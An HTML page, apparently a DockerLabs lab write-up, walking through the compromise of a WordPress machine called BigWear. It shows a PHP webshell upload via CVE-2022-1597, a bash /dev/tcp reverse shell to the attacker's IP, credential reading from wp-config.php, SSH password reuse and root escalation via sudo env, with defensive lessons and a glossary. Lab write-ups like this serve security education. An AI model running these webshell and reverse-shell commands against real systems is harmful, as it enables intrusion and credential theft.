+                    <div><span class="o-ok">22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2</span></div>
+                    <div>| ssh-hostkey:</div>
+                    <div>|_ 256 aa:bb:cc:dd:ee:ff:... (ED25519)</div>
+                    <div><span class="o-ok">80/tcp open http Apache httpd 2.4.57</span></div>
+                    <div>|_http-title: BigWear — Your Online Store</div>
+                    <div>|_http-generator: <span class="o-warn">WordPress 6.3.1</span></div>
+                    <div>|_http-server-header: Apache/2.4.57 (Debian)</div>
+                </div>
+
+                <div class="warn-box">
+                    <p class="warn-box-title">// Observation</p>
+                    <p>
+                        The HTTP banner reveals <strong>WordPress 6.3.1</strong> as the CMS, which completely shifts
+                        our enumeration strategy. The next phase will focus on identifying
+                        <strong>vulnerable plugins</strong> and <strong>WordPress users</strong> via WPScan.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="enumeracion">
+                <p class="section-label">// 03</p>
+                <h2 class="section-title">Web Enumeration</h2>
+                <div class="section-line"></div>
+
+                <div class="step-marker">
+                    <div class="step-num">1</div>
+                    <span class="step-title">WPScan — Plugin and user enumeration</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        WPScan is the reference tool for auditing WordPress installations. The
+                        <span class="hl-pur">--enumerate p</span> flag lists installed plugins, and
+                        <span class="hl-pur">--enumerate u</span> attempts to enumerate users. The
+                        <span class="hl-pur">--plugins-detection aggressive</span> flag activates a more thorough
+                        mode that checks known installation paths for each plugin.
+                    </p>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd="wpscan --url http://172.17.0.2 --enumerate p,u --plugins-detection aggressive">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">WPSCAN</span>
+                    <div><span class="prompt">$ </span><span class="cmd">wpscan <span class="flag">--url</span> <span
+                                class="arg">http://172.17.0.2</span> <span class="flag">--enumerate</span> <span
+                                class="arg">p,u</span> <span class="flag">--plugins-detection</span> <span
+                                class="arg">aggressive</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="o-accent">[+]</span> WordPress version 6.3.1 identified (Insecure, released on
+                        2023-10-12).</div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-accent">[+]</span> WordPress theme in use: storefront</div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-warn">[!] Plugin(s) Identified:</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-ok">[+] advanced-file-manager</span></div>
+                    <div> | Location: http://172.17.0.2/wp-content/plugins/advanced-file-manager/</div>
+                    <div> | Latest Version: <span class="o-warn">7.1.4</span> (out of date)</div>
+                    <div> | Last Updated: 2023-09-01</div>
+                    <div> |</div>
+                    <div> | Found By: Known Locations</div>
+                    <div> |</div>
+                    <div> | <span class="o-bad">[!] 1 vulnerability identified:</span></div>
+                    <div> | - Title: Advanced File Manager &lt;= 7.1.4 — Subscriber+ Arbitrary File Upload</div>
+                    <div> | - Fixed in: 7.1.5</div>
+                    <div> | - References: <span class="o-accent">CVE-2022-1597</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-accent">[+]</span> Enumerating Users ...</div>
+                    <div><span class="o-ok">[+] mario</span></div>
+                    <div> | Found By: Author Posts - Author Pattern (Aggressive Detection)</div>
+                </div>
+
+                <div class="info-box">
+                    <p class="info-box-title">// CVE-2022-1597 — Arbitrary File Upload</p>
+                    <p>
+                        The vulnerability affects the <strong>Advanced File Manager</strong> plugin up to version
+                        7.1.4. A user with the <strong>Subscriber</strong> role (or higher) can upload arbitrary
+                        files without MIME-type validation, including <strong>PHP scripts</strong> that will execute
+                        on the server. This grants direct Remote Code Execution (RCE).
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="explotacion">
+                <p class="section-label">// 04</p>
+                <h2 class="section-title">Exploitation</h2>
+                <div class="section-line"></div>
+
+                <div class="step-marker">
+                    <div class="step-num">1</div>
+                    <span class="step-title">Register as Subscriber and upload webshell</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        The WordPress installation allows public user registration. We register with the
+                        <span class="hl">Subscriber</span> role, which is sufficient to exploit CVE-2022-1597.
+                        We prepare a minimal PHP webshell to execute commands:
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd='echo "&lt;?php system($_GET[&apos;cmd&apos;]); ?&gt;" > shell.php'>
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">SHELL</span>
+                    <div><span class="prompt">$ </span><span class="cmd">echo <span class="arg">"&lt;?php
+                                system(\$_GET['cmd']); ?&gt;"</span> &gt; shell.php</span></div>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        We navigate to the plugin from the WordPress panel (<strong>wp-admin → File Manager</strong>),
+                        upload <span class="hl">shell.php</span> to the <span class="hl">uploads</span> folder,
+                        and access it to verify command execution:
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="curl 'http://172.17.0.2/wp-content/uploads/shell.php?cmd=id'">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">VERIFY RCE</span>
+                    <div><span class="prompt">$ </span><span class="cmd">curl <span
+                                class="arg">'http://172.17.0.2/wp-content/uploads/shell.php?cmd=id'</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div class="o-ok">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">2</div>
+                    <span class="step-title">Upgrade to reverse shell</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        With RCE confirmed, we start a Netcat listener on our machine and send a reverse shell
+                        through the webshell. We use Bash for the reverse shell as it is the most reliable
+                        option on Linux systems.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="nc -lvnp 4444">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">LISTENER</span>
+                    <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span
+                                class="arg">4444</span></span></div>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd="curl 'http://172.17.0.2/wp-content/uploads/shell.php?cmd=bash+-c+%27bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261%27'">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">REV SHELL</span>
+                    <div><span class="prompt">$ </span><span class="cmd">curl <span
+                                class="arg">'http://172.17.0.2/wp-content/uploads/shell.php?cmd=bash+-c+<span
+                                    style="color:var(--danger)">%27bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261%27</span>'</span>
+                    </div>
+                </div>
+
+                <div class="output-block">
+                    <div>listening on [any] 4444 ...</div>
+                    <div>connect to [YOUR_IP] from (UNKNOWN) [172.17.0.2] 49832</div>
+                    <div class="o-ok">bash: no job control in this shell</div>
+                    <div class="o-warn">www-data@bigwear:/var/www/html/wp-content/uploads$</div>
+                </div>
+
+                <div class="info-box">
+                    <p class="info-box-title">// Tip — URL encoding</p>
+                    <p>
+                        Special characters in the reverse shell payload (spaces, <code>&gt;</code>,
+                        <code>&amp;</code>) must be URL-encoded to be transmitted via GET.
+                        Use <code>python3 -c "import urllib.parse; print(urllib.parse.quote('YOUR_PAYLOAD'))"</code>
+                        to automatically encode the string.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="postexplot">
+                <p class="section-label">// 05</p>
+                <h2 class="section-title">Post-Exploitation</h2>
+                <div class="section-line"></div>
+
+                <div class="step-marker">
+                    <div class="step-num">1</div>
+                    <span class="step-title">TTY stabilization</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        The obtained shell is a <em>dumb shell</em> without a full TTY. This causes problems:
+                        Ctrl+C kills the session, <code>sudo</code> fails without showing a prompt, and editors like
+                        <code>vim</code> won't work. We stabilize the shell in three steps:
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="script /dev/null -c bash">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">STEP 1</span>
+                    <div><span class="prompt">www-data$ </span><span class="cmd">script /dev/null <span
+                                class="flag">-c</span> <span class="arg">bash</span></span></div>
+                </div>
+
+                <div class="cmd-block" data-cmd="">
+                    <span class="cmd-label">STEP 2</span>
+                    <div><span class="comment"># Ctrl+Z to send to background</span></div>
+                    <div><span class="prompt">$ </span><span class="cmd">stty raw <span class="flag">-echo</span> ;
+                            fg</span></div>
+                </div>
+
+                <div class="cmd-block" data-cmd="export TERM=xterm">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">STEP 3</span>
+                    <div><span class="prompt">www-data$ </span><span class="cmd">export <span
+                                class="arg">TERM=xterm</span></span></div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">2</div>
+                    <span class="step-title">Credential hunting — wp-config.php</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        The <span class="hl">wp-config.php</span> file stores WordPress database credentials in
+                        plaintext. It is one of the first files to check when compromising a WordPress server, since
+                        administrators frequently reuse these passwords for their system accounts.
+                    </p>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd="cat /var/www/html/wp-config.php | grep -E 'DB_USER|DB_PASSWORD|DB_NAME'">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">CONFIG</span>
+                    <div><span class="prompt">www-data$ </span><span class="cmd">cat <span
+                                class="arg">/var/www/html/wp-config.php</span> <span class="flag">| grep -E</span> <span
+                                class="arg">'DB_USER|DB_PASSWORD|DB_NAME'</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div>define( 'DB_NAME', <span class="o-accent">'bigwear_db'</span> );</div>
+                    <div>define( 'DB_USER', <span class="o-accent">'mario'</span> );</div>
+                    <div>define( 'DB_PASSWORD', <span class="o-warn">'bigwear2024!'</span> );</div>
+                    <div>define( 'DB_HOST', 'localhost' );</div>
+                </div>
+
+                <div class="cred-box">
+                    <div class="cred-item">
+                        <div class="cred-label">User</div>
+                        <div class="cred-val">mario</div>
+                    </div>
+                    <div class="cred-item">
+                        <div class="cred-label">Password</div>
+                        <div class="cred-val">bigwear2024!</div>
+                    </div>
+                    <div class="cred-item">
+                        <div class="cred-label">Source</div>
+                        <div class="cred-val" style="color:var(--text-2);font-size:0.78rem;">wp-config.php</div>
+                    </div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">3</div>
+                    <span class="step-title">SSH login — password reuse</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        We identified the user <span class="hl">mario</span> during WPScan enumeration.
+                        We test the password found in wp-config.php to access via SSH:
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="ssh mario@172.17.0.2">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">SSH</span>
+                    <div><span class="prompt">$ </span><span class="cmd">ssh <span
+                                class="arg">mario@172.17.0.2</span></span></div>
+                    <div><span class="comment"># Password: bigwear2024!</span></div>
+                </div>
+
+                <div class="output-block">
+                    <div>mario@172.17.0.2's password: </div>
+                    <div>Linux bigwear 6.1.0-21-amd64 #1 SMP Debian 6.1.90-1 (2024-05-03) x86_64</div>
+                    <div>&nbsp;</div>
+                    <div class="o-ok">mario@bigwear:~$</div>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="privesc">
+                <p class="section-label">// 06</p>
+                <h2 class="section-title">Privilege Escalation</h2>
+                <div class="section-line"></div>
+
+                <div class="step-marker">
+                    <div class="step-num">1</div>
+                    <span class="step-title">Sudo enumeration</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        The first vector to check is always <span class="hl">sudo -l</span>, which lists the commands
+                        the current user can run as root without a password. A positive result here is usually the
+                        fastest path to escalation.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="sudo -l">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">SUDO</span>
+                    <div><span class="prompt">mario@bigwear:~$ </span><span class="cmd">sudo <span
+                                class="flag">-l</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div>Matching Defaults entries for mario on bigwear:</div>
+                    <div> env_reset, mail_badpass</div>
+                    <div>&nbsp;</div>
+                    <div>User mario may run the following commands on bigwear:</div>
+                    <div> <span class="o-bad">(ALL : ALL) NOPASSWD: /usr/bin/env</span></div>
+                </div>
+
+                <div class="warn-box">
+                    <p class="warn-box-title">// Misconfiguration detected</p>
+                    <p>
+                        <strong>/usr/bin/env</strong> allows executing any program in the current environment.
+                        If it can be run as <strong>root without a password</strong>, it can launch
+                        <strong>any command as root</strong>, including a shell. This is a sudo misconfiguration
+                        documented in <strong>GTFOBins</strong>.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="root">
+                <p class="section-label">// 07</p>
+                <h2 class="section-title">Root</h2>
+                <div class="section-line"></div>
+
+                <div class="step-marker">
+                    <div class="step-num">1</div>
+                    <span class="step-title">Escalate via sudo env</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        With <code>sudo /usr/bin/env</code> we can launch <code>/bin/bash</code> directly as root.
+                        The <code>env</code> command without environment variables simply executes the binary
+                        passed to it — in this case, a shell:
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="sudo /usr/bin/env /bin/bash">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">ROOT</span>
+                    <div><span class="prompt">mario@bigwear:~$ </span><span class="cmd">sudo /usr/bin/env <span
+                                class="arg">/bin/bash</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div class="o-bad">root@bigwear:/home/mario#</div>
+                    <div>&nbsp;</div>
+                    <div><span class="prompt" style="color:var(--danger)">root@bigwear:~# </span>whoami</div>
+                    <div class="o-bad">root</div>
+                    <div>&nbsp;</div>
+                    <div><span class="prompt" style="color:var(--danger)">root@bigwear:~# </span>cat /root/root.txt
+                    </div>
+                    <div class="o-ok">c0ngr4ts_y0u_0wn3d_b1gw34r!</div>
+                </div>
+
+                <div class="info-box">
+                    <p class="info-box-title">// Lessons learned</p>
+                    <p>
+                        This machine perfectly illustrates the concept of <strong>defence in depth</strong>. Each
+                        failed security layer (outdated plugin → plaintext credentials → password reuse → misconfigured
+                        sudo) chains into the next. A single control applied correctly at any point would have broken
+                        the attack chain. <strong>Keep plugins updated, use environment variables or secret managers,
+                            and regularly audit your sudo rules.</strong>
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="glosario">
+                <p class="section-label">// 08</p>
+                <h2 class="section-title">Glossary</h2>
+                <div class="section-line"></div>
+
+                <div class="glos-grid">
+
+                    <div class="glos-card">
+                        <div class="glos-term">WPScan — WordPress Security Scanner</div>
+                        <div class="glos-def">
+                            <strong>WPScan</strong> is the reference tool for auditing WordPress installations.
+                            It performs version enumeration of the core, themes and plugins; user detection via
+                            techniques such as author enumeration and XML-RPC; and vulnerability lookups against
+                            public databases like WPVulnDB. Its <code>--plugins-detection aggressive</code> mode
+                            checks known installation paths for thousands of plugins to detect installed ones even
+                            when they are not visible in the frontend. A free API key is required to access the
+                            real-time vulnerability database; without it, only outdated versions are reported
+                            without CVE details. Indispensable in any WordPress audit.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">CVE — Common Vulnerabilities and Exposures</div>
+                        <div class="glos-def">
+                            The <strong>CVE</strong> system is a public dictionary of security vulnerabilities
+                            maintained by MITRE Corporation. Each entry has a unique identifier
+                            (<code>CVE-YEAR-NUMBER</code>), a description, and references to advisories and
+                            exploits. The <strong>CVSS (Common Vulnerability Scoring System)</strong> assigns a
+                            severity score from 0 to 10. CVE-2022-1597 (Arbitrary File Upload in Advanced File
+                            Manager) has a CVSS of <strong>8.8 (High)</strong> because it enables remote code
+                            execution with low privilege level in WordPress. Databases such as
+                            <strong>NVD (nvd.nist.gov)</strong> and <strong>Exploit-DB</strong> cross-reference
+                            CVEs with public exploits and mitigations.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">Reverse Shell</div>
+                        <div class="glos-def">
+                            A <strong>reverse shell</strong> is a technique where the victim system initiates a
+                            connection back to the attacker's machine (as opposed to a bind shell, where the
+                            attacker connects to the victim). This is essential in penetration testing because
+                            most firewalls block inbound connections but allow outbound ones. The Bash payload
+                            <code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code> redirects stdin, stdout
+                            and stderr to a TCP socket, creating a remote interactive shell.
+                            <strong>Netcat</strong> (<code>nc -lvnp 4444</code>) acts as the listener on our
+                            machine.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">Password Reuse</div>
+                        <div class="glos-def">
+                            <strong>Password reuse</strong> is one of the most common and effective attack vectors
+                            in real environments. It occurs when a user or administrator uses the same password
+                            across multiple services or accounts. In a WordPress context, the database credentials
+                            stored in <code>wp-config.php</code> are frequently reused as system user passwords.
+                            Mitigation involves using a <strong>password manager</strong> (Bitwarden, 1Password),
+                            generating unique random passwords for each service, and separating application
+                            credentials from system ones via dedicated users with minimal permissions
+                            (<em>principle of least privilege</em>).
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">GTFOBins — Unix Binaries Privilege Escalation</div>
+                        <div class="glos-def">
+                            <strong>GTFOBins</strong> (gtfobins.github.io) is a curated list of standard Unix
+                            binaries that can be used to escalate privileges, bypass security restrictions, or
+                            execute arbitrary commands in constrained access contexts. It is community-maintained
+                            and organised by technique: <em>sudo</em>, <em>SUID</em>, <em>capabilities</em>,
+                            <em>cron</em>, etc. For <code>env</code> specifically, if it has unrestricted sudo
+                            permissions, it allows executing any binary as root via <code>sudo env /bin/sh</code>.
+                            It is the first reference to consult when <code>sudo -l</code> reveals an unexpected
+                            binary.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">TTY — Shell Stabilisation</div>
+                        <div class="glos-def">
+                            A <strong>TTY</strong> (Teletypewriter) is a full terminal interface that provides
+                            support for control signals (Ctrl+C, Ctrl+Z), command history, and correct rendering
+                            of curses-based interfaces (vim, sudo, etc.). Reverse shells obtained via webshells
+                            are <em>dumb shells</em> without TTY, which causes Ctrl+C to kill the session.
+                            The command <code>script /dev/null -c bash</code> forces pseudo-TTY allocation:
+                            <code>script</code> records terminal sessions and pointing it to <code>/dev/null</code>
+                            discards the log; <code>-c bash</code> specifies that the process to record is an
+                            interactive bash session, which creates a full TTY. The subsequent steps
+                            (<code>stty raw -echo; fg</code> and <code>export TERM=xterm</code>) synchronise
+                            the terminal size and disable local echo so the shell works correctly.
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <footer>
+        © Designed & Built by <em>Fran</em> — BigWear · DockerLabs Write-up · April 2026
+    </footer>
+
+    <script>
+        const navEl = document.getElementById('nav');
+        window.addEventListener('scroll', () => {
+            navEl.style.borderBottomColor = scrollY > 30
+                ? 'rgba(0,210,255,0.1)' : 'rgba(0,210,255,0.07)';
+        }, { passive: true });
+
+        window.addEventListener('scroll', () => {
+            const winScroll = document.documentElement.scrollTop;
+            const height = document.documentElement.scrollHeight - window.innerHeight;
+            const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+            document.getElementById('readingProgress').style.width = scrolled + '%';
+        }, { passive: true });
+
+        const sections = document.querySelectorAll('.section[id]');
+        const tocLinks = document.querySelectorAll('.toc-list a');
+        const tocObserver = new IntersectionObserver(entries => {
+            entries.forEach(e => {
+                if (e.isIntersecting) {
+                    tocLinks.forEach(a => a.classList.remove('active'));
+                    const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+                    if (active) active.classList.add('active');
+                }
+            });
+        }, { rootMargin: '-20% 0px -65% 0px' });
+        sections.forEach(s => tocObserver.observe(s));
+
+        const obs = new IntersectionObserver(entries => {
+            entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+        }, { threshold: 0.06 });
+        document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+        function showToast(msg) {
+            let toast = document.querySelector('.toast');
+            if (!toast) {
+                toast = document.createElement('div');
+                toast.className = 'toast';
+                document.body.appendChild(toast);
+            }
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+
+        function copyCmd(btn) {
+            const block = btn.closest('.cmd-block');
+            const cmd = block.dataset.cmd || '';
+            if (!cmd) return;
+            navigator.clipboard.writeText(cmd).then(() => {
+                btn.textContent = '✓';
+                btn.classList.add('copied');
+                showToast('Command copied ✓');
+                setTimeout(() => {
+                    btn.textContent = 'COPY';
+                    btn.classList.remove('copied');
+                }, 1800);
+            }).catch(() => showToast('Copy error'));
+        }
+    </script>
+
+</body>
+
+</html>
